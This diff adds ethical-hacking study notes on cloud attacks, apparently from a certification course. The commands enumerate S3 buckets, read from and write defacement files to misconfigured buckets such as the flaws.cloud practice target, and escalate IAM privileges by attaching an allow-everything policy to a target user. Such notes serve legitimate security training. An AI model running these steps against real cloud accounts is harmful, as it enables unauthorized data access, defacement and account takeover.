@@ -1,0 +1,95 @@
+
+## Cloud Computing 19
+
+    # Enumerate S3 Buckets
+	lazys3
+		ruby lazys3.rb
+		ruby lazys3.rb HackerOne
+		ruby lazys3.rb flaws.cloud
+
+	S3Scanner
+		cat sites.txt
+		flaws.cloud
+		reddit.com
+		etc...
+	
+		python3 s3scanner.py sites.txt
+	#Udemy
+	cloud_enum
+		cloud_enum -k certifiedhacker --disable-azure --disable-gcp
+
+	S3BucketList v2.1 (chrome extension)
+		https://github.com/AlecBlance/S3BucketList
+
+
+    # Exploit S3 Buckets
+	pip3 install awscli
+	aws configure	(ask for key)
+		https://console.aws.amazon.com (need aws account)
+		Sign in with root user -> Security Credentials -> Create Access keys
+	Paste the Access Key ID:
+	Paste the Secret Access key:
+	
+	aws s3 ls s3://certifiedhacker02
+
+	https://certifiedhacker02.s3.amazonaws.com/
+
+	echo “You have been hacked” >> Hack.txt
+	aws s3 mv Hack.txt s3://certifiedhacker02
+
+	https://certifiedhacker02.s3.amazonaws.com/
+
+	aws s3 rm s3://certifiedhacker02/Hack.txt
+
+
+	#Udemy
+	aws s3 ls s3://flaws.cloud/ --no-sign-request
+	aws s3 cp s3://flaws.cloud/secret.html . --no-sign-request
+	aws s3 cp ./index.html s3://flaws.cloud --no-sign-request
+
+	aws configure --profile aman
+	aws s3 ls s3://flaws.cloud/ --profile aman
+	aws s3 --profile aman cp s3://flaws.cloud/file.txt .
+
+	Tip : [search flaws challenge in google and read the medium writeup]
+	
+
+    # Perform Privilege Escalation to Gain Higher Privileges
+
+	aws configure
+	vim user-policy.json
+	
+		"Version":"2012-10-17",
+
+		"Statement": [
+			{
+
+			"Effect":"Allow",
+
+			"Action":"*",
+
+			"Resource":"*"
+
+			}
+		]
+	
+	
+	:wq!
+	
+
+	aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json 
+	aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
+	aws iam list-attached-user-policies --user-name [Target Username]
+	aws iam list-users 
+	
+    	# Extra
+		List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+
+		User Policies: aws iam list-user-policies
+
+		Role Policies: aws iam list-role-policies
+
+		Group policies: aws iam list-group-policies
+
+		Create user: aws iam create-user
+
